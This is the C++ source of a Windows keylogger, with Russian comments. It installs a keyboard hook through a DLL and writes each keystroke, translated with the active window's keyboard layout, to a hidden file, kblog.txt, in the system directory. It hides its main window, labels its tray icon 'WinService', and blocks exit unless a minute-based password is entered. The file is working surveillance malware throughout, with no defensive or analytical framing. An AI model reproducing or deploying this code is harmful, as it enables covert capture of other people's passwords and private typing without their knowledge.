// keylogger.cpp: определяет точку входа для приложения.
//

#include "stdafx.h"
#include "keylogger.h"
//#pragma comment(lib, "comctl32.lib")
#include <fstream>
#include <regex>
// Глобальные переменные:
HINSTANCE hInst;								// текущий экземпляр
TCHAR szTitle[MAX_LOADSTRING];					// Текст строки заголовка
TCHAR szWindowClass[MAX_LOADSTRING];			// имя класса главного окна

TCHAR buf[70];
HINSTANCE hDll;
HANDLE hLogFile;
NOTIFYICONDATA nid;
DWORD writted;
extern const std::map<BYTE, LPTSTR> keyDescr;

// Отправить объявления функций, включенных в этот модуль кода:
ATOM				MyRegisterClass(HINSTANCE hInstance);
HWND				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	password_dialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);

BOOL(*SetHook)(HWND, UINT);
BOOL(*UnsetHook)();

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
 	// TODO: разместите код здесь.
	GetSystemDirectory(buf, sizeof buf / sizeof(TCHAR));
	if (!(hLogFile = CreateFile(tString{ tString{ buf } + tString{ _T("\\kblog.txt") } }.data(), GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL)))
		return 1;
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		SetFilePointer(hLogFile, NULL, NULL, FILE_END);
	else
		WriteFile(hLogFile, reinterpret_cast<LPCVOID>(&BOM), sizeof(wchar_t), &writted, NULL);
	MSG msg;

	// Инициализация глобальных строк
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_KEYLOGGER, szWindowClass, MAX_LOADSTRING);
	//hDll = LoadLibrary(tString{ tString{ buf } + tString{ _T("\\kbHook_dll") } }.data());
	hDll = LoadLibraryW(tString{ _T(".\\kbHook_dll") }.data());
	if (hDll == 0)
		return FALSE;
	SetHook = reinterpret_cast<BOOL(*)(HWND, UINT)>(GetProcAddress(hDll, "SetHook"));
	UnsetHook = reinterpret_cast<BOOL(*)()>(GetProcAddress(hDll, "UnsetHook"));
	MyRegisterClass(hInstance);

	// Выполнить инициализацию приложения:
	/*if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}*/
	if (!SetHook(InitInstance(hInstance, nCmdShow), HM_KEYBOARD))
		return 1;
	// Цикл основного сообщения:
	while (GetMessage(&msg, NULL, 0, 0) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnsetHook();
	FreeLibrary(hDll);
	//log_file.close();
	CloseHandle(hLogFile);
	return (int) msg.wParam;
}



//
//  ФУНКЦИЯ: MyRegisterClass()
//
//  НАЗНАЧЕНИЕ: регистрирует класс окна.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON_CAT));
	wcex.hCursor = NULL;
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_ICON_CAT));

	return RegisterClassEx(&wcex);
}

//
//   ФУНКЦИЯ: InitInstance(HINSTANCE, int)
//
//   НАЗНАЧЕНИЕ: сохраняет обработку экземпляра и создает главное окно.
//
//   КОММЕНТАРИИ:
//
//        В данной функции дескриптор экземпляра сохраняется в глобальной переменной, а также
//        создается и выводится на экран главное окно программы.
//
HWND InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;
   hInst = hInstance; // Сохранить дескриптор экземпляра в глобальной переменной
   hWnd = CreateWindow(szWindowClass, szTitle, NULL/*WS_OVERLAPPEDWINDOW*/,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);
   if (!hWnd)
      return FALSE;
   ShowWindow(hWnd, SW_HIDE);
   UpdateWindow(hWnd);
   return hWnd;
}

//
//  ФУНКЦИЯ: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  НАЗНАЧЕНИЕ:  обрабатывает сообщения в главном окне.
//
//  WM_COMMAND	- обработка меню приложения
//  WM_PAINT	-Закрасить главное окно
//  WM_DESTROY	 - ввести сообщение о выходе и вернуться.
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;
	static SHORT shift;
	static BYTE keyboardState[256];
	static HKL keyboardLayout;
	switch (message)
	{
	case WM_CREATE:
		ZeroMemory(&nid, sizeof(nid));
		nid.cbSize = sizeof(nid);
		nid.hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_ICON1));
		nid.hWnd = hWnd;
		nid.uID = ID_NI;
		_tcscpy_s(nid.szTip, _T("WinService"));
		nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
		nid.uCallbackMessage = WM_NIM;
		Shell_NotifyIcon(NIM_ADD, &nid);
		break;
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// Разобрать выбор в меню:
		switch (wmId)
		{
		case ID_NICM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case ID_NICM_EXIT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOGPASS), hWnd, password_dialog);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: добавьте любой код отрисовки...
		EndPaint(hWnd, &ps);
		break;
	case WM_NIM:
		switch (LOWORD(lParam))
		{
		case WM_RBUTTONUP:
			HMENU hMenu = CreatePopupMenu();
			AppendMenu(hMenu, MF_STRING, ID_NICM_ABOUT, _T("About"));
			AppendMenu(hMenu, MF_STRING, ID_NICM_EXIT, _T("Exit"));
			SetForegroundWindow(hWnd);
			POINT pt;
			GetCursorPos(&pt);
			TrackPopupMenu(hMenu, 0, pt.x, pt.y, 0, hWnd, NULL);
			break;
		}
		break;
	case HM_KEYBOARD:
		switch (wParam)
		{
		case VK_RETURN:
		case VK_BACK:
		case VK_ESCAPE:
		case VK_LEFT:
		case VK_RIGHT:
		case VK_UP:
		case VK_DOWN:
		case VK_INSERT:
		case VK_DELETE:
		case VK_HOME:
		case VK_END:
		case VK_PRIOR:
		case VK_NEXT:
			WriteFile(hLogFile, reinterpret_cast<LPCVOID>(keyDescr.find(wParam)->second), _tcslen(keyDescr.find(wParam)->second) * sizeof(wchar_t), &writted, NULL);
			break;
		default: {
			static LPDWORD dword_ptr = (DWORD*)lParam;
			shift = GetKeyState(VK_SHIFT);
	
			
			//keyboardLayout = GetKeyboardLayout(dword_ptr[1]); ok

			//exp

			//fgwind=GetForegroundWindow();
			//GetWindowThreadProcessId(fgwind, NULL);
			auto aWnd = GetForegroundWindow();
			auto pid =  GetWindowThreadProcessId(aWnd, NULL);
			keyboardLayout = GetKeyboardLayout(pid);
			GetKeyboardState(keyboardState);
			ToUnicodeEx(bool(shift >> (sizeof(SHORT) * 8 - 1)) ? (wParam | 256) : wParam, BYTE(HIWORD(dword_ptr[0])), keyboardState, buf, sizeof buf / sizeof(wchar_t), 0, keyboardLayout);
			WriteFile(hLogFile, reinterpret_cast<LPCVOID>(buf), sizeof(wchar_t), &writted, NULL);
			keyboardLayout = 0;
		}
		}
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// Обработчик сообщений для окна "О программе".
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
INT_PTR CALLBACK password_dialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_INITDIALOG:
		SendMessage(GetDlgItem(hDlg, IDC_EDITPASS), EM_LIMITTEXT, 9, 0);
		break;
	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDOK:
		{
			SYSTEMTIME st;
			TCHAR buf[100];
			std::basic_string<TCHAR> str;
			std::regex rge{ R"(\bpass:\d{2}\b)" };
			GetSystemTime(&st);
			*reinterpret_cast<DWORD*>(buf) = sizeof buf / sizeof TCHAR;
			GetDlgItemText(hDlg, IDC_EDITPASS, buf, 10);
			str = buf;
			//if (std::regex_match(str.begin(), str.end(), rge) && boost::lexical_cast<int>(buf + 5, _tcslen(buf) - 5) == st.wMinute / 3) {
			if (std::regex_match(str.begin(), str.end(), rge) && std::stoi(buf + 5) == st.wMinute / 3) {
				EndDialog(hDlg, LOWORD(wParam));
				Shell_NotifyIcon(NIM_DELETE, &nid);
				DestroyWindow(GetParent(hDlg));
			}
			else {
				SetDlgItemText(hDlg, IDC_STATICPWDSTATUS, _T("error"));
			}
		}
			break;
		case IDCANCEL:
			EndDialog(hDlg, LOWORD(wParam));
			break;
		}
	default:
		return FALSE;
	}
	return TRUE;
}